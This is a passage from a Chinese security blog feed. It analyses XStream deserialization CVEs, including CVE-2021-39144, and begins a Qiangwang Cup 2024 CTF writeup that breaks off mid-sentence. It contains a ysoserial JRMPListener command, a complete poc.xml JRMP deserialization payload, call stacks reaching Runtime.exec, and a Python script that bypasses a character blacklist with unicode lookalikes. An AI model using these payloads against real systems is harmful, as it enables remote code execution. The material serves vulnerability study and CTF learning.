8u231 是复现失败， 8u221 以及之前可以复现成功。</p><h4 id="版本说明-9"><a href="#版本说明-9" class="headerlink" title="版本说明"></a>版本说明</h4><p>无</p><h4 id="漏洞分析-9"><a href="#漏洞分析-9" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：已知 XStream 可以实现以 PriorityQueue 为入口的反序列化，于是让它和 yso JRMPClient 结合起来。ysoserial 的 JRMP 有两种攻击方式，其中一种是攻击者构建恶意 JRMPServer，并绑定一个 EvildObject；然后利用被攻击者存在的反序列化漏洞，去连接攻击者的 JRMPServer，并反序列化 EvildObject。显然，反序列化 EvildObject 需要被攻击方拥有 EvildObject 所需的对应依赖。（整个过程类似 RMI 的利用方式）</p><p>关于 yso JRMP 相关利用原理可以看参考链接。</p><p>首先，搭一个 JRMPListener ，上面绑定好要传给 Client 的 EvilObject。这里以 CC6 为例，被攻击方需要配置 CC依赖。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 &quot;calc&quot;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">parsedMessage</span>&gt;</span>true<span class="tag">&lt;/<span class="name">parsedMessage</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">soapVersion</span>&gt;</span>SOAP_11<span class="tag">&lt;/<span class="name">soapVersion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bodyParts</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">sm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">attachmentsInitialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">attachmentsInitialized</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nullIter</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">aliases</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">candidates</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">names</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">environment</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">registry</span> <span class="attr">class</span>=<span class="string">&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>UnicastRef<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>9999<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">short</span>&gt;</span>0<span class="tag">&lt;/<span class="name">short</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>false<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">registry</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">host</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">port</span>&gt;</span>9999<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">candidates</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">aliases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nullIter</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">sm</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/465726e64817ec0d451c922c78185466.png"></p><p>下面的 <code>sun.rmi.transport.LiveRef#read</code> 是进行 RMI 连接的逻辑。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d0c59b597676dd5fba5aaede017f1c86.png"></p><p>函数调用栈，这里只给到建立 RMI 链接，后面实际上就是恶意 RMI Server  攻击 RMI Client 的逻辑，不细说。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">read:291, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:493, UnicastRef (sun.rmi.server)</span><br><span class="line">readObject:455, RemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshallField:499, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:425, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">readFromStream:325, SerializableConverter$2 (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">readObjectOverride:123, CustomObjectInputStream (com.thoughtworks.xstream.core.util)</span><br><span class="line">readObject:365, ObjectInputStream (java.io)</span><br><span class="line">readObject:791, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1429, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1409, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1303, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:26, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-39144"><a href="#CVE-2021-39144" class="headerlink" title="CVE-2021-39144"></a>CVE-2021-39144</h3><h4 id="影响范围-10"><a href="#影响范围-10" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.17</p><h4 id="版本说明-10"><a href="#版本说明-10" class="headerlink" title="版本说明"></a>版本说明</h4><p>无</p><h4 id="漏洞分析-10"><a href="#漏洞分析-10" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：比较有意思的是 sink 点，<code>DTraceProbe#uncheckedTrigger</code> 有一个可控的反射调用 invoke，其他没啥说的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/468056dcf33e2cd2ebe140621371d113.png"></p><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">exec:620, Runtime (java.lang)</span><br><span class="line">exec:450, Runtime (java.lang)</span><br><span class="line">exec:347, Runtime (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">uncheckedTrigger:58, DTraceProbe (sun.tracing.dtrace)</span><br><span class="line">triggerProbe:269, ProviderSkeleton (sun.tracing)</span><br><span class="line">invoke:178, ProviderSkeleton (sun.tracing)</span><br><span class="line">compareTo:-1, $Proxy0 (com.sun.proxy)</span><br><span class="line">siftDownComparable:704, PriorityQueue (java.util)</span><br><span class="line">siftDown:690, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">callReadObject:113, SerializationMethodInvoker (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:452, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:257, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:65, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1157, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1141, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1021, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:26, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><h2 id="小疑问"><a href="#小疑问" class="headerlink" title="小疑问"></a>小疑问</h2><p>他们这些 poc.xml 是怎么写出来的？虽然本质上还是找链子，但是自己还原成 xml 还是有难度，得去学习 xstream 的官方文档？？</p><p>答：baizhu的ysomap已经写了对应的逻辑： <a href="https://github.com/wh1t3p1g/ysomap">https://github.com/wh1t3p1g/ysomap</a> ，或者是直接使用 xstream 的 toxml？？</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>官网： <a href="https://x-stream.github.io/security.html">https://x-stream.github.io/security.html</a></li><li>大部分看的这位师傅的： <a href="https://tttang.com/archive/1699/">https://tttang.com/archive/1699/</a></li><li><a href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/17807249.html">https://www.cnblogs.com/LittleHann/p/17807249.html</a></li><li><a href="https://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/">https://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/</a></li><li>yso JRMP 分析： <a href="https://www.cnblogs.com/nice0e3/p/14333695.html">https://www.cnblogs.com/nice0e3/p/14333695.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;XStream 是一个将 java bean 对象与 xml 互相转换的依赖包，有点类似 fastjson 的 json 对象互转。&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="XStream" scheme="https://jaspersec.top/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2024 线上赛 writeup</title>
    <link href="https://jaspersec.top/posts/357825894.html"/>
    <id>https://jaspersec.top/posts/357825894.html</id>
    <published>2024-12-31T10:52:00.000Z</published>
    <updated>2025-03-31T22:09:47.237Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> <a href="https://xmcve.com/">星盟安全团队</a>长期招新中~ 我们的目标是星辰大海！ </p><ul><li>简历格式：ID、联系方式、掌握技术、比赛情况</li><li>简历投递邮箱： <a href="mailto:&#120;&#109;&#x63;&#x76;&#x65;&#64;&#113;&#113;&#x2e;&#99;&#111;&#x6d;">&#120;&#109;&#x63;&#x76;&#x65;&#64;&#113;&#113;&#x2e;&#99;&#111;&#x6d;</a></li><li>联系QQ：1609410364</li></ul><p>强网杯 S8 Web赛题复现，顺手做了<code>docker</code>环境。<br>PS: 图片在GitHub图床，加载不出请更换网络。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/image-20241231190218034.png" alt="image-20241231190218034"></p><h2 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name pyblockly -d -p 8888:8080 sketchpl4ne/qwb2024:pyblockly_img</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><strong>思路：python unicode编码绕过+pyjail ast沙箱绕过和audithook绕过</strong></p><p>审题，blockly_json这个接口，接受json格式数据，解析成对应的python代码，然后执行。</p><p>注意到 print 和 text 的分支存在代码拼接问题，构造下payload就可以执行任意python代码。</p><p>但题目有几个限制：</p><ul><li>代码执行不能出现 blacklist_pattern 里的字符</li><li>verify_secure 有AST沙箱，禁了import 和 from import</li><li>audit hook，有event的黑名单和长度限制</li></ul><p><strong>字符bypass：</strong> json.loads支持unicode，fuzz 字符相等，但是unicode不等的字符，并替换：</p><figure class="highlight python"><figcaption><span>title:fuzz.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_bypass</span>(<span class="params">payload</span>):  </span><br><span class="line">    waf = <span class="string">&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span>  </span><br><span class="line">    length = <span class="number">10500</span>  </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> waf:  </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):  </span><br><span class="line">            <span class="keyword">if</span> unidecode.unidecode(<span class="built_in">chr</span>(i)) == c <span class="keyword">and</span> <span class="built_in">ord</span>(c) != i:  </span><br><span class="line">                payload = payload.replace(c, <span class="built_in">chr</span>(i))  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">if</span> i == length-<span class="number">1</span>:  </span><br><span class="line">            <span class="built_in">print</span>(c + <span class="string">&quot; not found.&quot;</span>)  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p><strong>AST沙箱和Audit hook绕过</strong> ：首先篡改内置函数len，把len设置成永久返回1，绕过长度限制；然后命令执行的payload选择的是 <a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html"> 